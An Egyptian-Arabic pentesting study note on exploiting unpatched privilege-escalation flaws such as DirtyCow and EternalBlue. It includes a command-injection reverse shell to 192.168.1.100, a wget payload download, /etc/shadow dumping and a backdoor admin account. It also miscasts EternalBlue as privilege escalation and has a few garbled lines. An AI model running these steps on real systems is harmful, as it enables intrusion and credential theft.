# **1. إيه هو Exploiting Unpatched Privilege Escalation Vulnerabilities؟**

## **الشرح العميق:**
ال"Exploiting Unpatched Privilege Escalation Vulnerabilities" يعني استغلال ثغرات في تصعيد الصلاحيات (Privilege Escalation) اللي لسه ما اتعمللهاش تحديث (Unpatched) في نظام أو برنامج. الثغرات دي بتكون عيوب في البرمجيات (زي نواة لينكس، ويندوز، أو تطبيقات) بتسمح لمستخدم عادي (Low Privilege) يصير لمستوى أعلى (زي root أو System). "Unpatched" يعني إن الثغرة معروفة (لها CVE مثلًا) بس النظام ما اتحدثش عشان يصلحها، فالمهاجم يقدر يستغلها بسهولة لو عرف إزاي.

- **أمثلة:** DirtyCow (CVE-2016-5195) في لينكس، أو EternalBlue (CVE-2017-0144) في ويندوز.
- **الهدف:** تصعيد الصلاحيات من مستخدم عادي لـ Admin/Root.

## **الأدوات والأوامر العملية:**
### 1. **فحص النظام:**
   - لينكس: `uname -r` -> `3.16.0-38-generic` (لو قديم، ممكن يكون متأثر).
   - ويندوز: `systeminfo` -> تشوف الإصدار ومستوى التحديثات.
## 2. **البحث عن ثغرات:**
   - `searchsploit linux kernel 3.16` ->متاحة Exploits يجيب 
### 3. **Metasploit:**
   - `msfconsole` -> `search privilege escalation`.

## **خلاصة بالعامية المصرية:**
"يعني زي ما تكون لقيت خرم في حيطة البيت لسه محدش سده، تدخل منه وتبقى الكبير جوا! Unpatched يعني النظام نايم وما حدثش، فتقدر تطلع الباشا بسهولة."

---

# **2. ليه المشكلة دي خطيرة؟**

## **الشرح العميق:**
الثغرات دي خطيرة لأنها بتفتح الباب للمهاجم يتحكم في النظام كله لو ما اتعمللهاش Patch. يعني:
- **تصعيد صلاحيات:** من مستخدم عادي لـ root/System.
- **تحكم كامل:** يسرق بيانات، يزرع Backdoors، أو يخرب النظام.
- **انتشار أوسع:** يستخدم النظام المخترق كقاعدة لمهاجمة أنظمة تانية.

في الـ Pentesting، الثغرات اللي ما اتحدثتش بتكون ذهب لأنها بتديك طريق سريع للوصول للقمة لو النظام متأخر في التحديثات.

## **الأدوات والأوامر العملية:**
### 1. **فحص الثغرات:**
   - لينكس: `cat /etc/os-release` + `uname -r` -> قارن بالـ CVEs.
   - ويندوز: `wmic qfe list` -> لو ما لقيتش تحديثات حديثة، ابحث عن Exploits.
### 2. **تشغيل Exploit:**
   - لو لقيت CVE-2016-5195 (DirtyCow):
     - `gcc -pthread dirty.c -o dirtycow && ./dirtycow`.
### 3. **Metasploit مثال:**
   - `use exploit/windows/local/ms10_092_schelevator` -> لو ويندوز قديم.

## **خلاصة بالعامية المصرية:**
"المشكلة خطيرة لأنها زي ما تكون سايب باب البيت مكسور وما صلحتوش، أي حد يخش ياخد كل حاجة! المهاجم يلاقي الثغرة دي، يبقى الكبير بتاع النظام في ثواني."

---

# **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم الثغرات اللي ما اتعمللهاش Patch عشان تصعد صلاحياتك من مستخدم عادي لـ Admin/Root.
- **مثال واقعي:** لو لقيت سيرفر لينكس قديم متأثر بـ DirtyCow، تشغل الـ Exploit وتاخد root.

## **خلاصة بالعامية المصرية:**
"لما تلاقي ثغرة زي دي، زي ما تكون لقيت كنز في لعبة، تستخدمه وتبقى الكبير بتاع الماتش من غير ما حد يحس!"

---

# **خطوات عملية للاستغلال في Pentesting**

## **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 80: Apache 2.4.29 (لينكس).
  - Port 445: SMB (ويندوز).

## **الخطوة 2: الوصول الأولي**
- لو لقيت ثغرة ويب:
  - `http://192.168.1.10/ping?ip=127.0.0.1; id` -> لو رجع `www-data`:
  - `http://192.168.1.10/ping?ip=127.0.0.1; /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`.
  - `nc -lvnp 4444` -> Shell.

## **الخطوة 3: التحقق من الإصدار**
- في لينكس:
  - `uname -r` -> `3.16.0-38-generic` (متأثر بـ DirtyCow مثلًا).
- في ويندوز:
  - `systeminfo | findstr "OS Version"` -> `6.1.7600` (Windows 7 بدون SP1، متأثر بـ MS17-010).

## **الخطوة 4: البحث عن Exploit**
- لينكس:
  - `searchsploit linux kernel 3.16` -> يجيب DirtyCow (CVE-2016-5195).
- ويندوز:
  - `searchsploit windows 7 privilege` -> يجيب MS17-010 (EternalBlue).

## **الخطوة 5: تشغيل الـ Exploit**
- **في لينكس (DirtyCow):**
  - `wget http://192.168.1.100/dirty.c -O /tmp/dirty.c`.
  - `gcc -pthread /tmp/dirty.c -o /tmp/dirtycow`.
  - `./tmp/dirtycow` -> يضيف مستخدم `firefart` كـ root.
  - `su firefart` -> كلمة السر `firefart` -> `id` -> `uid=0(root)`.
- **في ويندوز (MS17-010):**
  - `msfconsole`.
  - `use exploit/windows/smb/ms17_010_eternalblue`.
  - `set RHOSTS 192.168.1.10`.
  - `set LHOST 192.168.1.100`.
  - `exploit` -> Shell كـ `SYSTEM`.

## **الخطوة 6: استغلال وتوثيق**
- كـ root/System:
  - لينكس: `cat /etc/shadow` -> تسريب كلمات السر.
  - ويندوز: `net user hacker pass123 /add && net localgroup administrators hacker /add`.
- سجل الثغرة (مثل CVE-2016-5195) والإصدار المتأثر في تقريرك.

## **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت سلاح قوي في لعبة، ضربت بيه الكل، وطلعت الكبير بتاع الحتة! الثغرات اللي ما اتحدثتش طريقك للفوز بسهولة لو لقيتها."

---

# **الخلاصة النهائية:**
Exploiting Unpatched Privilege Escalation Vulnerabilities هي طريقة خطيرة وفعالة لتصعيد الصلاحيات لو النظام ما اتحدثش. في الـ Pentesting، دور على الإصدارات القديمة بـ `uname` أو `systeminfo`، استخدم أدوات زي Searchsploit أو Metasploit عشان تشغل الـ Exploits، ووري 
العميل إن نظامه زي بيت مكسور لو ما حدثش! بالطريقة دي، تبقى البطل بتاع اللعبة بكل سهولة!


---
# اختبر حفظك : [[Exploiting unpatched privilege escalation vulnerabilities (Q).]]